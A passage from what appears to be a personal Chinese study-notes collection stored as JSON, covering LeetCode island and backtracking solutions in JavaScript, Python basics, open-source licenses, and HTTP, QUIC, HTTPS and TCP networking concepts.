的位置会直接返回，所以只要把经过的位置都设置为 `0`，就可以起到不走回头路的作用\n\n\n```javascript\nvar numIslands = function (grid) {\n  let res = 0;\n  let m = grid.length,\n    n = grid[0].length;\n  // 遍历 grid\n  for (let i = 0; i < m; i++) {\n    for (let j = 0; j < n; j++) {\n      if (grid[i][j] === \"1\") {\n        // 每发现一个岛屿，岛屿数量加一\n        res++;\n        // 然后使用 DFS 将岛屿淹了\n        dfs(grid, i, j);\n      }\n    }\n  }\n  return res;\n};\n\n// 从 (i, j) 开始，将与之相邻的陆地都变成海水\nvar dfs = function (grid, i, j) {\n  let m = grid.length,\n    n = grid[0].length;\n  if (i < 0 || j < 0 || i >= m || j >= n) {\n    // 超出索引边界\n    return;\n  }\n  if (grid[i][j] === \"0\") {\n    // 已经是海水了\n    return;\n  }\n  // 将 (i, j) 变成海水\n  grid[i][j] = \"0\";\n  // 淹没上下左右的陆地\n  dfs(grid, i + 1, j);\n  dfs(grid, i, j + 1);\n  dfs(grid, i - 1, j);\n  dfs(grid, i, j - 1);\n};\n\n```\n\n\n## 3. 封闭岛屿的数量\n\n> 力扣第 1254 题「[统计封闭岛屿的数目](https://leetcode.cn/problems/number-of-closed-islands)」\n\n### 3.1. 要点\n\n- `1` 代表陆地，`0` 代表`海水`\n- 所谓「封闭岛屿」就是上下左右全部被 `1` 包围的 `0`，也就是说`靠边的陆地不算作「封闭岛屿」`\n\n即`半岛`不算，`全岛`才算\n\n### 3.2. 思路\n\n- 先把靠边的都淹掉\n\t- 把靠上边的岛屿淹掉\n\t- 把靠下边的岛屿淹掉\n\t- 把靠左边的岛屿淹掉\n\t- 把靠右边的岛屿淹掉\n- 然后再遍历，思路就和上题一样了\n\t- 从 `(i, j)` 开始，将与之相邻的陆地都变成海水\n\n### 3.3. 代码\n\n```javascript hl:6,12,8,14\nvar closedIsland = function (grid) {\n  var m = grid.length,\n    n = grid[0].length;\n  // 主函数：计算封闭岛屿的数量\n  for (let j = 0; j < n; j++) {\n    // 把靠上边的岛屿淹掉\n    dfs(grid, 0, j);\n    // 把靠下边的岛屿淹掉\n    dfs(grid, m - 1, j);\n  }\n  for (let i = 0; i < m; i++) {\n    // 把靠左边的岛屿淹掉\n    dfs(grid, i, 0);\n    // 把靠右边的岛屿淹掉\n    dfs(grid, i, n - 1);\n  }\n  // 遍历 grid，剩下的岛屿都是封闭岛屿\n  let res = 0;\n  for (let i = 0; i < m; i++) {\n    for (let j = 0; j < n; j++) {\n      if (grid[i][j] == 0) {\n        res++;\n        dfs(grid, i, j);\n      }\n    }\n  }\n  return res;\n\n  // 从 (i, j) 开始，将与之相邻的陆地都变成海水\n  function dfs(grid, i, j) {\n    let m = grid.length,\n      n = grid[0].length;\n    if (i < 0 || j < 0 || i >= m || j >= n) {\n      return;\n    }\n    if (grid[i][j] == 1) {\n      // 已经是海水了\n      return;\n    }\n    // 将 (i, j) 变成海水\n    grid[i][j] = 1;\n    // 淹没上下左右的陆地\n    dfs(grid, i + 1, j);\n    dfs(grid, i, j + 1);\n    dfs(grid, i - 1, j);\n    dfs(grid, i, j - 1);\n  }\n};\n\n```\n\n## 4. 岛屿的最大面积\n\n![图片&文件](./files/20241113-5.png)\n\n\n只不过 `dfs` 函数淹没岛屿的同时，还应该想办法`记录`这个岛屿的面积。\n\n```javascript\nvar maxAreaOfIsland = function (grid) {\n  // 记录岛屿的最大面积\n  let res = 0;\n  let m = grid.length,\n    n = grid[0].length;\n  for (let i = 0; i < m; i++) {\n    for (let j = 0; j < n; j++) {\n      if (grid[i][j] == 1) {\n        // 淹没岛屿，并更新最大岛屿面积\n        res = Math.max(res, dfs(grid, i, j));\n      }\n    }\n  }\n  return res;\n\n  // 淹没与 (i, j) 相邻的陆地，并返回淹没的陆地面积\n  function dfs(grid, i, j) {\n    let m = grid.length,\n      n = grid[0].length;\n    if (i < 0 || j < 0 || i >= m || j >= n) {\n      // 超出索引边界\n      return 0;\n    }\n    if (grid[i][j] == 0) {\n      // 已经是海水了\n      return 0;\n    }\n    // 将 (i, j) 变成海水\n    grid[i][j] = 0;\n\n    return (\n      dfs(grid, i + 1, j) +\n      dfs(grid, i, j + 1) +\n      dfs(grid, i - 1, j) +\n      dfs(grid, i, j - 1) +\n      1\n    );\n  }\n};\n\n```\n\n","QUUJRHdS":"\n# 回溯算法解数独\n\n\n> 力扣第 37 题「[解数独](https://leetcode.cn/problems/sudoku-solver)」\n\n\n## 目录\n<!-- toc -->\n ## 数独定义 \n\n下面几种情况都不能有相同的数字出现：\n- 每行\n- 每列\n- `每一个 3×3` 的小方格\n\n","dvVYEYya":"\n# 回溯算法解括号生成\n\n`#回溯算法` \n\n> 力扣第 22 题「[括号生成](https://leetcode.cn/problems/generate-parentheses)」\n\n\n输入是一个正整数 `n`，输出是 `n` 对儿括号的**所有合法组合**\n- `n` 代表 `括号的对数`\n\n比如说，输入 `n=3`，输出为如下 5 个字符串：\n\n```bash\n\"((()))\",\n\"(()())\",\n\"(())()\",\n\"()(())\",\n\"()()()\"\n```\n\n代码如下：\n\n```javascript\nvar generateParenthesis = function (n) {\n  let track = \"\";\n  let res = [];\n\n  const backtrack = (left, right) => {\n    // 若左括号剩下的多，说明不合法\n    if (right < left) return;\n    // 数量小于 0 肯定是不合法的\n    if (left < 0 || right < 0) return;\n    // 当所有括号都恰好用完时，得到一个合法的括号组合\n    if (left === 0 && right === 0) {\n      res.push(track);\n      return;\n    }\n\n    // 做选择，尝试放一个左括号\n    track += \"(\";\n    backtrack(left - 1, right);\n    // 撤销选择\n    track = track.slice(0, -1);\n\n    // 做选择，尝试放一个右括号\n    track += \")\";\n    backtrack(left, right - 1);\n    // 撤销选择\n    track = track.slice(0, -1);\n  };\n\n  backtrack(n, n);\n  return res;\n};\n\n```","tdce7xNo":"\n# 划分为 k 个相等的子集\n\n\n\n![图片&文件](./files/20241113-6.png)\n\n","daIm7SIB":"\n# 前言\n\n\n> 计算机科学（CS）相关的笔记、博客等\n\n","8yJAXv4d":"\n# Python 编程语言\n\n\n`#python` \n\n- [1.  Python 语言基础](/post/t9yAwurF.html)\n- [2. Python 函数与模块](/post/d2ODbFLg.html)\n- [3. Python 类](/post/RpWPjiDH.html)\n- [4. Python 文件与异常处理](/post/shcetXOs.html)\n\n","t9yAwurF":"\n# Python 语言基础\n\n`#python`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 变量、字符、数字、注释 \n\n```python\n############################################\n####### 字符串的常用方法\n################# ##########################\nname = \"hello world\";\n# 注意：首字母大写\nprint(name.title()); # Hello World\nprint(name.upper()); # HELLO WORLD\nprint(name.lower()); # hello world\n\n############################################\n####### f 的用法\n################# ##########################\nfirstName = \"ada\";\nlastName = \"lovelace\";\n# f代表format，将变量的值插入到字符串中\nfullName = f\"{firstName} {lastName}\";\nfullName2 = f\"{firstName.upper()} {lastName.title()}\";\nprint(fullName); # ada lovelace\nprint(fullName2); # ADA Lovelace\n\n\n############################################\n####### 打印换行、制表符等\n############################################\nprint(\"Languages:\\n\\tPython\\n\\tC\\n\\tJavaScript\")\n\n\n############################################\n####### 删除空白\n############################################\nfavorite_language = ' python ';\nprint(favorite_language); # ' python '\nprint(favorite_language.rstrip()); # ' python'\nprint(favorite_language.lstrip()); # 'python '\nprint(favorite_language.strip()); # 'python'\n\n\n############################################\n########  删除前缀和后缀\n############################################\nurl = \"https://www.baidu.com\";\nprint(url.removeprefix('https://')) # 'www.baidu.com'\nprint(url.removesuffix('.com')) # 'https://www.baidu'\n\n############################################\n########  使用下划线分隔数字\n############################################\nlargeNum = 14_000_000_000;\nlargeNum1 = 14_00_0_000_0_00;\nprint(largeNum); # 14000000000\nprint(largeNum1); # 14000000000\n\n############################################\n########  多个赋值\n############################################\nx, y, z = 0, 0, 0;\n\n\n############################################\n########  常量\n############################################\nMAX_NUM = 1000;\n\n\n############################################\n########  注释\n############################################\n# This is a comment\n# This is another comment\n# 多行注释\n\n\"\"\"\n这是多行注释 1\n这是多行注释 2\n这是多行注释 3\n\"\"\"\n\n'''\n这也是一个多行注释。\n同样可以跨越多行。\n'''\n\n\ndef greet(name):\n    \"\"\"\n    这个函数用于打招呼。\n    参数:\n    name (str): 要问候的人的名字\n    返回:\n    str: 包含问候语的字符串\n    \"\"\"\n    return f\"Hello, {name}!\"\n\n```\n\n## 2. 列表、range、元组\n\n```python\n############################################\n####### 列表的基本操作\n###########################################\n\narr = [1, 2, 3, 4, 5];\nprint(arr); # [1, 2, 3, 4, 5]\nprint(len(arr)) # 5, 获取列表长度\n\n# 列表的修改\n# 修改索引 2 的元素\narr[2] = 3;\n\n# 列表的追加\narr.append(6);\n\n# pop 方法用于删除列表中的元素\narr.pop(); # 删除最后一个元素\narr.pop(0); # 删除索引 0 的元素\n\n# remove 方法用于删除列表中的元素\narr.remove(2);\n\n# 列表的插入\n# 在索引 2 的位置插入 7\narr.insert(2, 7);\n\n# 列表的删除\n# 删除索引 2 的元素\ndel arr[2];\n\n# 列表的更新\n# 更新索引 2 的元素\narr[2] = 8;\n\n# 列表的拼接\narr2 = [9, 10, 11];\narr3 = arr + arr2;\n\n############################################\n####### 列表的排序、反转\n###########################################\n\n# 列表的永久排序\narr.sort() # 默认升序\narr.sort(reverse=True); # 升序\narr.sort(reverse=False) # 降序\n\n# 列表的临时排序\nsorted(arr); # 默认升序\n\n# 列表的反转\narr.reverse();\n\n############################################\n####### 列表的遍历\n###########################################\n\n# 列表的遍历\nfor i in arr:\n    print(i);\n\n############################################\n####### range 函数\n###########################################\nfor i in range(0, 10):\n    print(i);\n\n# 使用 list 函数将 range 转换为列表\nlist1 = list(range(0, 10));\n\n############################################\n####### 列表的统计\n###########################################\n\nmax(arr); # 获取列表中的最大值\nmin(arr); # 获取列表中的最小值\nsum(arr); # 获取列表中的和\n\n############################################\n####### 列表的推导式\n###########################################\n\nsquares = [value ** 2 for value in range(1, 11)];\n\nprint(squares); # [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]\n\n############################################\n####### 列表的切片\n###########################################\n# 列表的切片\narr[0:2]; # 表示从索引 0 开始，到索引 2 结束，但不包括索引 2\narr[:2]; # 如果省略第一个索引，Python 将从列表开头开始\narr[2:] # 如果省略第二个索引，Python 将从第一个索引开始，到列表末尾结束\n\n############################################\n####### 复制列表\n###########################################\n\n# 复制列表\n# 通过切片的方式复制列表\narr1 = arr[:];\n\narr2 = arr; # 这种方式不是复制列表，而是将 arr2 指向 arr 的内存地址\n\n############################################\n####### 元组\n###########################################\n\n# 元组是不可变的列表\n# 元组使用圆括号\n# 元组的元素不可修改\n# 元组的元素不可删除\n# 元组的元素不可添加\ndimestion = (200, 50);\nprint(dimestion[0]);\nprint(dimestion[1]);\n\n# 遍历元组\nfor i in dimestion:\n    print(i);\n\n```\n\n## 3. 条件判断、布尔、逻辑\n\n```python\n############################################\n####### if else statement\n###########################################\n\n# True and False\n# ==, !=, >, <, >=, <=\n# and, or, not\n# if, elif, else 记得后面要加冒号\n\n```\n\n## 4. 字典\n\n```python\n############################################\n####### 字典\n###########################################\n\n# 字典是一种可变容器模型，且可存储任意类型对象。\nfavorite = {\n    'name': 'zhangsan',\n    'age': 18,\n}\n# 删除字典 使用 delete \n\n# 遍历字典\nfor key, value in favorite.items():\n    print(key, value)\n\n# 遍历字典的键\nfor key in favorite.keys():\n    print(key)\n\n# 遍历字典的值\nfor value in favorite.values():\n    print(value)\n\n# 字典嵌套\n# 字典中的值也可以是字典\n# 字典中的值也可以是列表\n# 字典中的值也可以是元组\n# 字典中的值也可以是集合\n# 字典中的值也可以是字符串\n# ... 任意类型\n\n```\n\n## 5. 用户输入\n\n```python\n############################################\n####### 用户输入\n###########################################\n\n# input()函数接受一个标准输入数据，返回为 string 类型。\n\nmessage = input(\"请输入你要翻译的内容：\")\nprint(\"你输入的内容是：\", message)\n```\n\n## 6. while 循环\n\n```python\n############################################\n####### while 循环\n###########################################\n\nn = 1;\nwhile n <= 5:\n    n = n + 1\n    print(\"n:\",n)\n\n# 输出结果: 2 3 4 5 6\n\nprint(\"===========================\");\n\n# 使用 break 语句退出循环\n\nm = 1;\nwhile m <= 5:\n    if m == 3:\n        break\n    m += 1\n    print(\"m:\",m)\n\n# 使用 continue 语句跳过当前循环，继续下一次循环\n\nj = 1;\nwhile j <= 5:\n    if j == 3:\n        j += 1\n        continue\n    j = j + 1\n\n# 使用 while 移除列表中的所有元素\narr = [1,2,3,4,5]\nwhile arr: # 当 arr 不为空时, 循环继续\n    cur = arr.pop()\n    print(\"cur:\",cur)\n\n# 输出结果: 5 4 3 2 1\n\n```","d2ODbFLg":"\n# Python 函数与模块\n\n`#python` \n\n\n## 目录\n<!-- toc -->\n ## 1. 函数的定义和调用 \n\n```python\n############################################\n####### 函数的定义和调用 ####################\n###########################################\n\n# 函数的定义\n# def 函数名(参数列表):\n    # 函数体\n\n# 定义\ndef my_print():\n    print(\"hello world\")\n\n# 函数的调用\nmy_print()\n\ndef my_print2(name):\n    print(\"hello\", name)\n\nmy_print2(\"world\")\nmy_print2(name=\"world\")\n\n```\n\n## 2. 函数的参数默认值\n\n```python\n############################################\n####### 函数的参数默认值 ####################\n###########################################\n\n# 默认值: 如果调用函数时没有传入参数，那么就会使用默认值\n# 如果第一个参数有默认值，那么后面的参数也必须有默认值\ndef my_print3(name = \"liguwe\", age = 18):\n    print(\"hello\", name, age)\n\n# 默认值\n# 如果调用函数时没有传入参数，那么就会使用默认值\ndef my_print4(name, age = 18):\n    print(\"hello\", name, age)\n```\n\n\n## 3. 函数的返回值\n\n\n```python\n############################################\n####### 函数的返回值 ####################\n###########################################\n\ndef get_fromatted_name(first_name, last_name):\n    full_name = first_name + \" \" + last_name\n    return full_name.title()\n\nname = get_fromatted_name(\"li\", \"guangwei\") # Li Guangwei\n\n# 返回字典\ndef build_person(first_name, last_name, age=None):\n    person = {\n        \"first\": first_name,\n        \"last\": last_name\n    }\n    if age:\n        person[\"age\"] = age\n    return person\n\n```\n\n\n## 4. 传递列表参数\n\n```python\n############################################\n####### 传递列表 ####################\n###########################################\n\n# 传递列表\ndef greet_users(names):\n    for name in names:\n        name = name + \"!\"\n        msg = \"hello, \" + name\n        print(msg)\n\nusernames = [\"li\", \"guangwei\", \"zhang\", \"san\"]\n\n# output: hello, li! hello, guangwei! hello, zhang! hello, san!\ngreet_users(usernames)\n\n# 传递列表,避免修改原列表\nusernames2 = [\"li\", \"guangwei\", \"zhang\", \"san\"]\ngreet_users(usernames2[:])\n```\n\n## 5. 传递任意数量的实参\n\n```python\n############################################\n####### 传递任意数量的实参 ####################\n###########################################\n\n# 传递任意数量的实参\n# *args: 会创建一个元组\n# **kwargs: 会创建一个字典\n\ndef make_pizza(*toppings):\n    print(toppings)\n\n# ('pepperoni',)\nmake_pizza(\"pepperoni\");\n# ('mushrooms', 'green peppers', 'extra cheese')\nmake_pizza(\"mushrooms\", \"green peppers\", \"extra cheese\");\n\n# 结合使用【位置实参】和【任意数量实参】\ndef make_pizza1(size,*toppings):\n    print(size)\n    print(toppings)\n\nmake_pizza1(12, \"pepperoni\");\nmake_pizza1(16, \"mushrooms\", \"green peppers\", \"extra cheese\");\n```\n\n\n## 6. 模块\n\n```python\n############################################\n####### 导入模块 ####################\n###########################################\n\n# 导入模块\n# import module_name\n\n# 导入模块，并指定别名\n# import module_name as mn\n\n# # 导入模块中的某个函数\n# from module_name import function_name\n\n# 导入模块中的函数，并指定别名\n# from module_name import function_name as fn\n\n# 导出模块中的所有函数\n# from module_name import *\n\n# 导入模块中的特定函数\n# from module_name import function_0, function_1, function_2\n\n```","RpWPjiDH":"\n# Python 类\n\n`#python`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义类、访问属性、调用方法 \n\n```python\n\n# 创建类\n# class 类名:\n    # 类体\n    # 类体中可以定义变量和函数\n    # 类体中的函数第一个参数必须是self\n    # self代表类的实例对象\n    # 类体中的函数第一个参数必须是self\n\n# example 创建 \u001ePerson 类\nclass Person:\n    # 类体\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    # 方法 1\n    def say_hi(self):\n        print('Hello, how are you?')\n    # 方法 2\n    def say_name(self):\n        print(f'Hello, my name is {self.name}')\n    # 方法 3\n    def say_age(self):\n        print(f'Hello, my age is {self.age}')\n\nperson = Person('Alice', 25)\n# 访问属性\nprint(person.name)\nprint(person.age)\n# 调用方法\nperson.say_hi()\nperson.say_name()\nperson.say_age()\n\n```\n\n## 2. 继承\n\n```python\n########################################################\n##### 继承\n########################################################\n\nclass Animal:\n    def __init__(self, name, age):\n        print(\"Animal\")\n\n    def eat(self):\n        print(\"eat\")\n\n    def drink(self):\n        print(\"drink\")\n\n# 传入父类参数\n\nclass Dog(Animal):\n\n    def __init__(self, name, age):\n        # 调用父类的构造函数\n        super().__init__(name, age)\n        print(\"Dog\")\n\n    def bark(self):\n        print(\"bark\")\n\n    def eat(self):\n        print(\"Dog eat\")\n\n```\n\n## 3. 导出类模块\n```python\n########################################################\n##### 导出类模块\n########################################################\n\n# car.py\nclass Animal:\n    def __init__(self, name, age):\n        print(\"Animal\")\n\n    def eat(self):\n        print(\"eat\")\n\n    def drink(self):\n        print(\"drink\")\n\nclass Dog(Animal):\n\n    def __init__(self, name, age):\n        # 调用父类的构造函数\n        super().__init__(name, age)\n        print(\"Dog\")\n\n    def bark(self):\n        print(\"bark\")\n\n    def eat(self):\n        print(\"Dog eat\")\n\n# 导入类模块\nfrom animal import Animal, Dog\n\n# 导入整个模块\nimport animal\n\n# 导出所有类\nimport animal import *\n\n```\n\n## 4. 代码风格\n\n**\n- 类使用大驼峰\n- 函数使用_分割","shcetXOs":"\n# Python 文件与异常处理\n\n`#python` \n\n\n\n## 目录\n<!-- toc -->\n ## 1. 使用 pathlib 读取文件内容 \n\n```python\n# pathlib 模块: 用于处理文件路径\nfrom pathlib import Path\n\npath = Path(\"main.py\")\n\n# 读取 main.py 文件的内容\ncontent = path.read_text()\n\nprint(content)\n\n```\n\n## 2. 写入文件\n\n```python\n# pathlib 模块: 用于处理文件路径\nfrom pathlib import Path\n\npath = Path(\"programing.txt\")\n\npath.write_text(\"Hello, world!\")\n\n```\n\n\n## 3. 使用 try-except 避免报错\n\n### 3.1. ZeroDivisionError\n\n```python\ntry:\n    print(1/0)\nexcept ZeroDivisionError as e:\n    print(e)\n    print('error')\n\n```\n\n### 3.2. FileNotFoundError\n\n```python\nfrom pathlib import Path\n\npath = Path(\"no_exist.txt\")\n\ntry:\n    content = path.read_text()\nexcept FileNotFoundError:\n    print(\"File not found\")\n\n```\n\n\n### 3.3. 静默失败\n\n```python\n# 静默失败\n# 通过捕获异常，使得程序不会因为异常而终止\n# example\ndef divide(x, y):\n    try:\n        result = x / y\n    except ZeroDivisionError:\n        print(\"division by zero!\")\n        pass # 静默失败\n    else:\n        print(\"result is\", result)\n    finally:\n        print(\"executing finally clause\")\n```\n\n### 3.4. json.dumps：将 Python 对象编码成 JSON 字符串\n\n```python\nfrom pathlib import Path\nimport json\n\nnumbers = [1, 2, 3, 4, 5]\n\npath = Path(\"numbers.json\")\n\n# json.dumps() 方法将 Python 对象编码成 JSON 字符串\ncontents = json.dumps(numbers)\n\n# 将 JSON 字符串写入文件\npath.write_text(contents)\n\n```\n\n### 3.5. json.loads：JSON 字符串转换为 Python 对象\n\n```python\nfrom pathlib import Path\nimport json\n\npath = Path(\"numbers.json\")\n\ncontent =  path.read_text()\n\n# 使用 json.loads() 函数将 JSON 字符串转换为 Python 对象\ncontents = json.loads(content)\n\nprint(contents)\n\n```\n\n\n","YjQO1i4Z":"\n# 前言\n\n\n暂时未归类的","sPzvAS5O":"\n# 最常见的开源协议\n\n\n让我为您详细介绍几个最常见的开源协议：\n\n1. GPL (GNU General Public License)\n   - 最著名的开源协议之一\n   - 要求任何修改后的代码或衍生代码也必须使用GPL协议开源\n   - 分为GPL v2和GPL v3版本\n   - 具有传染性，即如果项目中使用了GPL协议的代码，整个项目都必须使用GPL协议\n\n2. AGPL (GNU Affero General Public License)\n   - 是GPL的一个变体，主要针对网络服务\n   - 比GPL更严格\n   - 要求通过网络提供服务的软件也必须开源\n   - 如果您修改了AGPL软件并在网络上运行，必须开放源代码\n   - 常用于防止云服务商利用开源软件但不回馈社区\n\n3. LGPL (GNU Lesser General Public License)\n   - GPL的宽松版本\n   - 允许将LGPL软件作为库链接到私有软件中\n   - 修改LGPL软件库本身的代码时需要开源\n   - 适用于类库或框架\n\n4. MIT License\n   - 最宽松的开源协议之一\n   - 只要保留版权声明，可以自由使用、修改、分发\n   - 可以用于商业软件\n   - 不要求修改后的代码必须开源\n   - 被广泛使用，如jQuery、Node.js等\n\n5. Apache License 2.0\n   - 比MIT稍严格，但仍然相对宽松\n   - 需要保留版权声明\n   - 需要声明修改\n   - 含有专利授权条款\n   - 可以用于商业软件\n\n6. BSD License\n   - 分为BSD 2-Clause和BSD 3-Clause\n   - 类似MIT，非常宽松\n   - 主要区别在于免责声明的细节\n   - 可以用于商业软件\n\n7. Mozilla Public License (MPL)\n   - 介于GPL和宽松协议之间\n   - 文件级别的copyleft\n   - 允许与其他协议的代码混合使用\n   - 修改MPL文件需要开源，但可以与私有代码一起发布\n\n协议选择建议：\n1. 如果希望代码完全自由分发，选择MIT\n2. 如果希望修改后的代码必须开源，选择GPL\n3. 如果是网络服务且希望修改必须开源，选择AGPL\n4. 如果是类库，考虑LGPL\n5. 如果考虑专利保护，选择Apache 2.0\n\n需要注意的事项：\n1. 在选择开源协议时要考虑项目的具体需求\n2. 注意不同协议的兼容性\n3. 商业使用时要特别注意GPL和AGPL的限制\n4. 建议在项目初始就选择合适的开源协议\n5. 如果使用他人的开源代码，必须遵守原协议要求\n\n这些是目前最常见的开源协议，每种协议都有其特点和适用场景。选择时要根据自己的项目需求和未来发展规划来决定。如果是商业项目，建议仔细评估使用GPL或AGPL的影响。","u37LLYdU":"\n# 前言\n\n\n（HTTP、TCP/IP、DNS、UDP、websocket等计算机网络知识）\n","mh0VAQAP":"\n# 关于HTTP 的一些常见问题汇总\n\n`#http` `#计算机网络`\n\n\n## 目录\n<!-- toc -->\n ## 1. websocket 与 HTTP 的区别 \n\n- 连接方式\n\t- ws：长连接、有状态\n\t- http：短连接、无状态\n- 都基于 TCP，都使用 res/req 模型\n- wss 与 https\n- 传递方式：\n\t- http：文本 \n\t- http2：二进制\n\t- ws： 协议帧\n- ws 使用 HTTP 建立连接，如下图\n\t- ![图片&文件](./files/20241025-18.png)\n\n## 2. http1.0 、http1.1、https、http2 、 http3 的区别\n\n- `HTTP1.0` \n\t- 每个请求都需要建立 TCP 连接\n\t- **都是串行请求**\n\t- 是一个必须被淘汰的协议\n- HTTP 1.1 \n\t- 可以设置 `keepalive` 来让HTTP**重用**TCP链接，即所谓的 HTTP 长连接，省去三次握手的巨大开销\n\t- 支持`pipeline`网络传输，即\n\t\t- **客户端可以连续发送多个请求，而不需要等待服务器的响应**。\n\t\t- 服务器必须按照接收请求的顺序返回响应。\n\t\t- 所有的请求和响应都通过**同一个 TCP** 连接传输\n\t\t- pipeline 的**对头阻塞**问题\n\t\t\t- ![图片&文件](./files/20241026-1.png)\n- HTTP 2.0 \n\t- 支持服务端 push \n\t- 二进制分帧协议\n\t- 多路复用\n\t\t- 在同一个 TCP 连接中，可以同时发送和接收多个 HTTP 请求/响应。\n\t\t- 所有请求都是并行的，不需要按顺序等待\n\t\t- 工作原理\n\t\t\t- 请求被分成小的数据帧\n\t\t\t- 每个帧都带有**标识**，表明属于哪个请求\n\t\t\t- 服务器可以同时处理这些帧，并以任意顺序返回\n\t\t\t- 客户端根据标识重组这些帧\n\t- 二进制的`流`与`帧`\n\t\t- ![图片&文件](./files/20241026.png)\n\t- HTTP 2.0 的 **队头阻塞**（Head-of-Line Blocking）问题\n\t\t- 问题原因：\n\t\t\t- 虽然 HTTP/2 在应用层实现了多路复用，但它仍然依赖于 TCP 这个可靠的传输层协议，并且 HTTP/2 的多路复用建立在`单个 TCP 连接之上`\n\t\t\t- 当 TCP 丢包时，整个 TCP 流都会暂停，等待丢失的包被重传\n\t\t\t- 这意味着所有的 HTTP/2 流都会被阻塞，即使它们是相互独立的\n- HTTP 3.0 \n\t- 无论 http1.0 的 pipleine 和 http2.0 的多路复用，都会出现 **队头阻塞**\n\t- 因为 TCP 是无解了，但是UDP是有解的 \n\t\t- ![图片&文件](./files/20241026-2.png)\n\n## 3. HTTP/3.0 如何解决队头阻塞问题\n\nHTTP/3.0 通过以下几个关键机制解决了队头阻塞问题：\n\n### 3.1. 基于 QUIC 的设计\n\n- HTTP/3 完全基于 QUIC 协议，而不是 TCP\n- QUIC 是建立在 **UDP 之上**的传输层协议\n- 这使得协议能够实现真正的多路复用，**每个流都是完全独立的**\n\t- 每个 Stream 都是独立的，一个 Stream 的问题不会影响其他 Stream，如下图\n\t- ![图片&文件](./files/20241115-8.png)\n\n### 3.2. 独立的流处理\n\n- 每个 HTTP 请求都在独立的 QUIC 流中处理\n- 一个流的包丢失只会影响该流，不会影响其他流\n- 数据可以按**任意顺序**到达，**不需要严格排序**\n\n```javascript\n1. 多路复用机制：\n   - 每个请求都在独立的QUIC Stream中传输\n   - Stream之间互不影响\n   - 每个Stream都有自己的流控制\n2. 包处理机制：\n   QUIC Packet Header {\n     Connection ID: 0x1234...  // 连接标识\n     Packet Number: 1          // 包序号\n     Stream ID: 1             // 流标识\n     Offset: 0               // 数据偏移量\n     Length: 1000           // 数据长度\n     Payload: ...          // 实际数据\n   }\n```\n\n### 3.3. 具体工作机制\n\n- 当发生丢包时，**只有丢包的那个特定流会等待重传**\n- 其他流可以继续正常传输数据\n- **每个流都有自己的流控制和拥塞控制机制**\n\n### 3.4. 优势体现\n\n- 在高丢包率的网络环境下性能更好\n- 特别适合移动网络等不稳定的网络环境\n- 显著减少了整体的延迟时间\n\n### 3.5. 实际应用场景： 假设一个网页同时加载多个资源\n\n- 图片流丢包 → **只影响该图片的加载**\n- CSS 文件继续正常加载\n- JavaScript 文件继续正常加载\n- HTML 内容继续正常传输\n\n### 3.6. 与 HTTP/2 的对比\n\n- HTTP/2：一个 TCP 包丢失会**阻塞所有流**\n- HTTP/3：**一个包丢失只影响相关的单个流**\n- 这种差异在高延迟或不稳定的网络中特别明显 \n\n### 3.7. 额外优化\n\n- 0-RTT 连接建立\n- 改进的拥塞控制\n- 连接迁移支持（比如从 WiFi 切换到 4G 时保持连接\n\n## 4. 请简述 QUIC \n\nQUIC（Quick UDP Internet Connections）是一个建立在 UDP 之上的传输层协议，它**解决了 UDP 的不可靠性**\n\n### 4.1. 基础架构\n\n- 基于 UDP 构建，但提供了类似 TCP 的可靠性\n- 将传输层和加密层合二为一\n- 在应用层实现了拥塞控制和可靠传输\n\n### 4.2. 核心特性\n\n- 0-RTT 连接建立：在已知服务器的情况下，可以立即发送数据\n- 内置加密：所有 QUIC 数据都默认加密，使用 TLS 1.3\n- 连接迁移：支持网络切换（如从 WiFi 切换到 4G）而保持连接\n\n### 4.3. 多路复用优势\n\n- 独立的流处理：每个流都是独立的，避免队头阻塞\n- 并行传输：多个流可以同时传输数据\n- 灵活的流控制：每个流都有自己的流控制机制 \n\n### 4.4. 安全特性\n\n- 所有数据强制加密\n- 加密和传输协议集成\n- 更好的隐私保护：减少了明文元数据 \n\n### 4.5. 性能优化\n\n- 快速握手：减少连接建立时间\n- 改进的拥塞控制\n- 更好的丢包恢复机制 \n\n### 4.6. 实际应用优势\n\n- 减少延迟：特别是在建立连接时\n- 更好的移动支持：支持网络切换，提高移动场景下的性能\n- 更好的流媒体和实时通信支持 \n- 改进的安全性：默认加密所有通信\n- 提高可靠性：特别是在不稳定的网络环境下\n\n### 4.7. 与传统协议的区别\n\n- TCP：严格的顺序传输，存在队头阻塞\n- QUIC：灵活的数据传输，避免队头阻塞\n- UDP：不可靠传输\n- QUIC：**在 UDP 之上构建可靠传输**\n\nQUIC 协议的这些特性使它特别适合现代互联网应用，尤其是在移动网络环境下。它已经成为 HTTP/3 的基础，并且正在被越来越多的大型网站和服务采用。\n\n## 5. 请简述 HTTPS 协议\n\n![图片&文件](./files/20241026-5.png)\n\n- 证书机制：\n\t- 网站需要获取 SSL/TLS 证书\n\t- 证书包含网站的公钥和身份信息\n\t- 由可信的证书颁发机构（CA）签发\n- 加密机制：\n\t- 使用**非对称加密**（公钥/私钥）**建立初始连接**\n\t- 使用**对称加密**进行实际数据传输\n\t- 结合两种加密方式的优势\n- 通信过程\n\t- 客户端发起 HTTPS 请求\n\t- 服务器发送 SSL 证书\n\t- 验证证书并交换密钥\n\t- 建立加密通信通道\n\t- 安全传输数据\n- 两个阶段：\n\t- ① 证书验证\n\t\t- 三方 CA 证书认证\n\t- ② 数据传输\n\t\t- 非对称加密：需要产出 客户端和服务端共享的 `随机码 key` ，用于下面的对称加密\n\t\t\t- ![图片&文件](./files/20241026-4.png)\n\t\t- 对称加密\n\t\t\t- 服务端和客户端共享 `随机码 key` ，分别用它加密和解密\n\n## 6. 简述网络七层协议\n\n![图片&文件](./files/20241026-6.png)\n\n## 7. tcp 怎么在`不可靠的传输`上保证`可靠` 的\n\n其实就是`位置标记` ，他可以标记位置\n\n![图片&文件](./files/20241026-9.png)\n\n## 8. 三次握手与四次挥手\n\n- 一个用于**连接**，一个用于**关闭**\n- 连接三次握手的必要性\n\t- 确认双方的收发能力\n\t\t- 第一次握手：表明`客户端`有发送能力\n\t\t- 第二次握手：表明`服务器`有接收和发送能力\n\t\t- 第三次握手：表明`客户端`有接收能力\n\t- 防止历史连接的建立\n\t- 同步双方的初始序列号\n- 关闭四次挥手的必要性\n\t- 确保数据完整传输\n\t\t- 第一次挥手：表示客户端不再发送数据， 但仍可接收数据\n\t\t- 